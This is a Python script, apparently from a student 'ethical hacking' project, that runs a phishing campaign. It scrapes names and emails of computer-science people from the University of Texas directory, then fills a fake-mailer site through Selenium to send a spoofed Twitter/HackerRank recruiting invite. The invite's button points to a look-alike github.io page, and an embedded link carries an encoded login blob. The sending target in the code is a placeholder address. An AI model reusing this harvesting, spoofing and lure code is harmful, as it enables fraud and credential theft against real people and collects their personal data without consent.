

import pyautogui
import requests
from requests import get
from requests.exceptions import RequestException
from contextlib import closing
from bs4 import BeautifulSoup
import time
from selenium import webdriver

letters = 'abcdefghijklmnopqrstuvwxyz'
major = 'computer+science'



f = open("emails.txt", "a")


for char in letters:

	url = 'https://directory.utexas.edu/advanced.php?aq%5BName%5D='+char+'&aq%5BCollege%2FDepartment%5D='+major+'&aq%5BTitle%5D=&aq%5BEmail%5D=&aq%5BHome+Phone%5D=&aq%5BOffice+Phone%5D=&scope=all'

	request = requests.get(url)

	soup = BeautifulSoup(request.content, 'html5lib')

	table = soup.find('div', attrs = {'id':'aresults'}) 
	print(soup.prettify)

	for row in table.find_all('li'):
		# row = table.find_all('li')[0]
		time.sleep(5)
		newRequest = requests.get('https://directory.utexas.edu/'+row.a['href'])
		person = BeautifulSoup(newRequest.content, 'html5lib')
		# print(person.prettify)
		person_table = person.find('table', attrs = {'class':'dir_info'})
		name = person_table.find_all('td')[1].get_text().split(",")[0].lstrip()
		email = person_table.find_all('td')[3].a['href'].split(":")[1].lstrip()

		print(name+","+email)
		f.write(name+","+email+"\n")

	time.sleep(60)
# print(soup.prettify)

f.close()


# read from file for list of emails
gmails=["fakeVictim@gmail.com"]
scams={"twitter":{"fromname":"HackerRank Team","from":"support@hackerrankforwork.com","subject":"HackerRank Team","text":'<div style="background:#f6f6f6 none;box-sizing:border-box;font-family:\'Helvetica Neue\',\'Helvetica\',Helvetica,Arial,sans-serif;font-size:14px;height:100%;line-height:1.6;margin:0;padding:0;width:100%!important" bgcolor="#f6f6f6"><table style="background:#ffffff;box-sizing:border-box;font-family:\'Helvetica Neue\',\'Helvetica\',Helvetica,Arial,sans-serif;font-size:14px;padding:0;width:100%" bgcolor="#ffffff"><tbody><tr style="box-sizing:border-box;font-family:\'Helvetica Neue\',\'Helvetica\',Helvetica,Arial,sans-serif;font-size:14px;margin:0;padding:0"><td style="box-sizing:border-box;font-family:\'Helvetica Neue\',\'Helvetica\',Helvetica,Arial,sans-serif;font-size:14px;margin:0;padding:0;vertical-align:top" valig<td style="box-sizing:border-box;clear:both!important;display:block!important;font-family:\'Helvetica Neue\',\'Helvetica\',Helvetica,Arial,sans-serif;font-size:14px;margin:0 auto;padding:0;vertical-align:top" valign="top"><div style="padding:20px;box-sizing:border-box;display:block;font-family:\'Helvetica Neue\',\'Helvetica\',Helvetica,Arial,sans-serif;font-size:14px;margin:0 auto"><table width="100%" cellpadding="0" cellspacing="0" style="border-radius:3px;box-sizing:border-box;font-family:\'Helvetica Neue\',\'Helvetica\',Helvetica,Arial,sans-serif;font-size:14px;margin:0 auto;padding:0"><tbody><tr style="box-sizing:border-box;font-family:\'Helvetica Neue\',\'Helvetica\',Helvetica,Arial,sans-serif;font-size:14px;margin:0;padding:0"><td style="box-sizing:border-box;font-family:\'Helvetica Neue\',\'Helvetica\',Helvetica,Arial,sans-serif;font-size:14px;margin:0;vertical-align:top" valign="top"><table width="100%" cellpadding="0" cellspacing="0" style="box-sizing:border-box;font-family:\'Helvetica Neue\',\'Helvetica\',Helvetica,Arial,sans-serif;font-size:14px;margin:0;padding:0"><tbody><tr style="box-sizing:border-box;font-family:\'Helvetica Neue\',\'Helvetica\',Helvetica,Arial,sans-serif;font-size:14px;margin:0;padding:0"><td style="background:#39424e;padding:15px 20px;border-top-left-radius:5px;border-top-right-radius:5px;box-sizing:border-box;color:#ffffff;font-family:\'Helvetica Neue\',\'Helvetica\',Helvetica,Arial,sans-serif;font-size:14px;margin:0;vertical-align:top" valign="top" bgcolor="#39424e"><div style="padding:8px;margin:0px 0px 8px 0px"><div style="font-size:26px;font-weight:700;line-height:30px;max-width:99%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">2020 Twitter University Recruiting Coding Challenge</div><div style="color:#979faf;font-size:15px;font-weight:600">Powered by HackerRank</div></div></td></tr></tbody></table><table width="100%" cellpadding="0" cellspacing="0" style="padding:20px;background:#fff;border-left-color:#e9e9e9;border-left-style:solid;border-left-width:1px;border-right-color:#e9e9e9;border-right-style:solid;border-right-width:1px;box-sizing:border-box;font-family:\'Helvetica Neue\',\'Helvetica\',Helvetica,Arial,sans-serif;font-size:14px;margin:0" bgcolor="#fff"><tbody><tr style="box-sizing:border-box;font-family:\'Helvetica Neue\',\'Helvetica\',Helvetica,Arial,sans-serif;font-size:14px;margin:0;padding:0"><td style="box-sizing:border-box;font-family:\'Helvetica Neue\',\'Helvetica\',Helvetica,Arial,sans-serif;font-size:14px;margin:0;padding:0 0 0px;vertical-align:top" valign="top"><table width="100%" cellpadding="0" cellspacing="0" style="background:#fff;border-left-color:#e9e9e9;border-left-width:1px;border-right-color:#e9e9e9;border-right-width:1px;box-sizing:border-box;font-family:\'Helvetica Neue\',\'Helvetica\',Arial,sans-serif;font-size:14px;margin:0;padding:20px" bgcolor="#fff"><tbody><tr style="box-sizing:border-box;font-family:\'Helvetica Neue\',\'Helvetica\',Arial,sans-serif;font-size:14px;margin:0;padding:0"><td style="box-sizing:border-box;font-family:\'Helvetica Neue\',\'Helvetica\',Helvetica,Arial,sans-serif;font-size:14px;margin:0;padding:0 0 20px;vertical-align:top" valign="top"><div><div style="margin-bottom:10px"><p dir="ltr">Hi there,</p><p dir="ltr">We received your Twitter University Recruiting application--thank you for applying!&nbsp;</p><p dir="ltr">You selected one or more career interests from the following options that allows you to demonstrate your technical aptitude through the Twitter HackerRank Coding Challenge.</p><ul><li dir="ltr"><p dir="ltr">Software Engineering</p></li><li dir="ltr"><p dir="ltr">Infrastructure Engineering&nbsp;&nbsp;</p></li></ul><p dir="ltr">While it is not mandatory, it is in your best interest to complete a coding challenge for internship opportunities &amp; full-time roles at Twitter. Coding challenges do not guarantee a next round of interviews.&nbsp;</p><p dir="ltr"><strong>APM, PMI,&nbsp;Twitter Academy Candidates</strong></p><p dir="ltr">The coding challenge is NOT required for APM, PMI, or Twitter Academy candidates, only optional. You received the coding challenge because you selected one or more of the technical career interests listed above.&nbsp;</p><p dir="ltr"><br><strong>Coding Challenge Information</strong></p><p dir="ltr">The coding challenge begins the moment you press ‘start challenge’ and will automatically end once the allocated time (24 hours) has passed. While you have 24 hours&nbsp;to complete the coding challenge, the estimated duration of the challenge is 60-minutes from start to finish.</p><p dir="ltr">You may choose the programming language you are most comfortable with prior to starting the challenge.</p><p dir="ltr"><strong>Questions regarding the Twitter Coding Challenge</strong></p><p dir="ltr">For all technical questions related to the Twitter Coding Challenge, please contact <a href="mailto:support@hackerrank.com" target="_blank">support@hackerrank.com</a></p><p>Since you’ve applied, tweet <a href="https://click.pstmrk.it/2sm/twitter.com%2FTwitterU/LLfyxQQ/EDcI/mMFqnphgZf/aHJ3LXRlc3QtaW52aXRl" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://click.pstmrk.it/2sm/twitter.com%252FTwitterU/LLfyxQQ/EDcI/mMFqnphgZf/aHJ3LXRlc3QtaW52aXRl&amp;source=gmail&amp;ust=1573339393279000&amp;usg=AFQjCNG3EAjtLEqZZlQoyhpFuqt5q3z8VA">@TwitterU</a> with #LoveTwitter and tell us why you want to work with us! Also, keep up with the day-to-day life of the&nbsp;<a href="https://click.pstmrk.it/2sm/twitter.com%2Fterns/LbfyxQQ/EDcI/WAFZa0FF2U/aHJ3LXRlc3QtaW52aXRl" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://click.pstmrk.it/2sm/twitter.com%252Fterns/LbfyxQQ/EDcI/WAFZa0FF2U/aHJ3LXRlc3QtaW52aXRl&amp;source=gmail&amp;ust=1573339393279000&amp;usg=AFQjCNEMsHlAM6PkG2pxhFPEbMvWN0Onig">@terns</a><a href="https://click.pstmrk.it/2sm/twitter.com%2FTwitterU/LLfyxQQ/EDcI/mMFqnphgZf/aHJ3LXRlc3QtaW52aXRl" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://click.pstmrk.it/2sm/twitter.com%252FTwitterU/LLfyxQQ/EDcI/mMFqnphgZf/aHJ3LXRlc3QtaW52aXRl&amp;source=gmail&amp;ust=1573339393279000&amp;usg=AFQjCNG3EAjtLEqZZlQoyhpFuqt5q3z8VA"> and</a> check out our interactive DM bot with&nbsp;<a href="https://click.pstmrk.it/2sm/twitter.com%2FTwitterU/LLfyxQQ/EDcI/mMFqnphgZf/aHJ3LXRlc3QtaW52aXRl" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://click.pstmrk.it/2sm/twitter.com%252FTwitterU/LLfyxQQ/EDcI/mMFqnphgZf/aHJ3LXRlc3QtaW52aXRl&amp;source=gmail&amp;ust=1573339393279000&amp;usg=AFQjCNG3EAjtLEqZZlQoyhpFuqt5q3z8VA">@TwitterU</a> for additional FAQs, student testimonials, and why #DiversityMatters.</p><p dir="ltr">Thanks,</p><p dir="ltr"><img alt="" height="23" src="https://lh5.googleusercontent.com/olRlCGfsPud6iJduJ3iPguA4JAUmE9QCEYQqRtO0pjfIForypkYyWGCutdX8dUYtDG7jFzdvFf8uuTLgVOsXO9v4sAJzcJ0joVSz_PblnpgOSsY4aha4slGvSbVn7I4byKVjAyen" width="27" class="CToWUd"></p><p dir="ltr">Twitter University Recruiting</p><p>Follow us at <a href="https://click.pstmrk.it/2sm/twitter.com%2FTwitterU/LLfyxQQ/EDcI/mMFqnphgZf/aHJ3LXRlc3QtaW52aXRl" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://click.pstmrk.it/2sm/twitter.com%252FTwitterU/LLfyxQQ/EDcI/mMFqnphgZf/aHJ3LXRlc3QtaW52aXRl&amp;source=gmail&amp;ust=1573339393279000&amp;usg=AFQjCNG3EAjtLEqZZlQoyhpFuqt5q3z8VA">@TwitterU</a> or visit us online at <a href="https://click.pstmrk.it/2sm/careers.twitter.com%2Fen%2Funiversity.html/LrfyxQQ/EDcI/xILHszyKGN/aHJ3LXRlc3QtaW52aXRl" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://click.pstmrk.it/2sm/careers.twitter.com%252Fen%252Funiversity.html/LrfyxQQ/EDcI/xILHszyKGN/aHJ3LXRlc3QtaW52aXRl&amp;source=gmail&amp;ust=1573339393279000&amp;usg=AFQjCNERmTJda2KLV8KzDQzJUXhNJvUC8g">t.co/university</a></p></div><div>You have been invited to attend the challenge <strong>2020 Twitter University Recruiting Coding Challenge</strong>. You can start the challenge anytime between <a href="https://click.pstmrk.it/2m/www.timeanddate.com%2Fworldclock%2Ffixedtime.html%3Fiso%3D2019-07-31T07%3A00%3A00/L7fyxQQ/EDcI/HdiAWlWetE/aHJ3LXRlc3QtaW52aXRl" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://click.pstmrk.it/2m/www.timeanddate.com%252Fworldclock%252Ffixedtime.html%253Fiso%253D2019-07-31T07%253A00%253A00/L7fyxQQ/EDcI/HdiAWlWetE/aHJ3LXRlc3QtaW52aXRl&amp;source=gmail&amp;ust=1573339393279000&amp;usg=AFQjCNET-z8HnqAdcI1HghGBsRfA8_jYzQ">31 Jul 2019 08:00 AM BST (Europe - London)</a> and <a href="https://click.pstmrk.it/2m/www.timeanddate.com%2Fworldclock%2Ffixedtime.html%3Fiso%3D2020-03-30T18%3A59%3A59/MLfyxQQ/EDcI/pm4nZcCoCl/aHJ3LXRlc3QtaW52aXRl" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://click.pstmrk.it/2m/www.timeanddate.com%252Fworldclock%252Ffixedtime.html%253Fiso%253D2020-03-30T18%253A59%253A59/MLfyxQQ/EDcI/pm4nZcCoCl/aHJ3LXRlc3QtaW52aXRl&amp;source=gmail&amp;ust=1573339393279000&amp;usg=AFQjCNHoNnwUnlt1xpx8ruZUTbJRFH0Iog">30 Mar 2020 07:59 PM BST (Europe - London)</a>. Please be sure to check for the date and time in your time zone. The duration of the challenge will be 1440 mins from the time you start. </div></td></tr><tr style="box-sizing:border-box;font-family:\'Helvetica Neue\',\'Helvetica\',Arial,sans-serif;font-size:14px;margin:0;padding:0"><td style="box-sizing:border-box;font-family:\'Helvetica Neue\',\'Helvetica\',Helvetica,Arial,sans-serif;font-size:14px;margin:0;padding:0 0 0px;vertical-align:top" valign="top"><div><a href="https://ethicalhackinggroup9.github.io/EthicalHacking/" style="background:#2ec866;border-color:#2ec866;border-style:solid;border-width:10px 20px;box-sizing:border-box;color:#fff;display:inline-block;font-family:\'Helvetica Neue\',\'Helvetica\',Helvetica,Arial,sans-serif;font-size:14px;font-weight:bold;line-height:1;margin:0;padding:0;text-align:center;text-decoration:none;text-transform:capitalize" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://click.pstmrk.it/2sm/www.hackerrank.com%252Ftests%252F7q9lhmq5c1b%252Flogin%253Fb%253DeyJ1c2VybmFtZSI6InByZXN0b25iYW8yQGdtYWlsLmNvbSIsInBhc3N3b3JkIjoiNDVmYmZiYWUiLCJoaWRlIjp0cnVlLCJhY2NvbW1vZGF0aW9ucyI6bnVsbH0%253D/MbfyxQQ/EDcI/UoBVptSrtl/aHJ3LXRlc3QtaW52aXRl&amp;source=gmail&amp;ust=1573339393279000&amp;usg=AFQjCNEIu8sAW-qcrTIYBzjjq2LKgegbbg">Start Challenge</a></div><div style="font-size:12px;margin-top:10px">You can also use this <a href="https://www.hackerrank.com/tests/7q9lhmq5c1b/login?b=eyJ1c2VybmFtZSI6InByZXN0b25iYW8yQGdtYWlsLmNvbSIsInBhc3N3b3JkIjoiNDVmYmZiYWUiLCJoaWRlIjp0cnVlLCJhY2NvbW1vZGF0aW9ucyI6bnVsbH0=" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://www.hackerrank.com/tests/7q9lhmq5c1b/login?b%3DeyJ1c2VybmFtZSI6InByZXN0b25iYW8yQGdtYWlsLmNvbSIsInBhc3N3b3JkIjoiNDVmYmZiYWUiLCJoaWRlIjp0cnVlLCJhY2NvbW1vZGF0aW9ucyI6bnVsbH0%3D&amp;source=gmail&amp;ust=1573339393279000&amp;usg=AFQjCNH-lisMvAwBrRijQgdZe_wghJvkxg">link</a> to access the challenge.</div></td></tr></tbody></table></td></tr></tbody></table><table width="100%" cellpadding="0" cellspacing="0" style="background:#e4e4e4;border-bottom-left-radius:5px;border-bottom-right-radius:5px;box-sizing:border-box;font-family:\'Helvetica Neue\',\'Helvetica\',Helvetica,Arial,sans-serif;font-size:14px;margin:0;padding:20px" bgcolor="#e4e4e4"><tbody><tr style="box-sizing:border-box;font-family:\'Helvetica Neue\',\'Helvetica\',Helvetica,Arial,sans-serif;font-size:14px;margin:0;padding:0"><td style="box-sizing:border-box;color:#000000;font-family:\'Helvetica Neue\',\'Helvetica\',Helvetica,Arial,sans-serif;font-size:11px;margin:0;vertical-align:top;line-height:1.6" valign="top"><p>Once you begin the challenge, the timer will start and cannot be paused. In case of power failure or loss of internet connection where you\'re unable to attempt the challenge, please contact the hiring firm by replying to this email. For technical queries concerning the platform, email us at <a href="mailto:support@hackerrank.com" target="_blank">support@hackerrank.com</a> or call us at (415) 900-4023 (US) or at +91 8880811222 (India). HackerRank only provides a platform to conduct the challenges. It does not schedule or evaluate any hiring challenges or conduct interviews for any company. Please directly contact the company that sent you the invite for such purposes.</p></td></tr></tbody></table></td></tr></tbody></table></div></td></tr></tbody></table></div>'}}
browser = webdriver.Firefox()
# driver = webdriver.Firefox(executable_path=r'your\path\geckodriver.exe')
browser.get('https://emkei.cz/')
for scamFormat in scams:
	for email in gmails:

		scam=scams[scamFormat]
		fromName = browser.find_element_by_id('fromname')
		fromName.send_keys(scam["fromname"])

		fromA = browser.find_element_by_id('from')
		fromA.send_keys(scam["from"])

		ToA = browser.find_element_by_id('rcpt')
		ToA.send_keys(email)

		subject = browser.find_element_by_id('subject')
		subject.send_keys(scam["subject"])

		# print("HTML")
		html = browser.find_element_by_id('html')
		html.click()

		text = browser.find_element_by_id('text')
		text.send_keys(scam["text"])

		browser.find_element_by_xpath("//input[@type='submit']").click()
		textInsideInputBox=browser.find_element_by_id('from').get_attribute("value")
		tryIt=2
		while textInsideInputBox!=None and textInsideInputBox!="":

			browser.find_element_by_xpath("//input[@type='submit']").click()

			tryIt-=1
			#prevent an infinitive loop 
			if tryIt<=0:
				browser.get('https://emkei.cz/')
				break

			textInsideInputBox=browser.find_element_by_id('from').get_attribute("value")
			time.sleep(20)


		
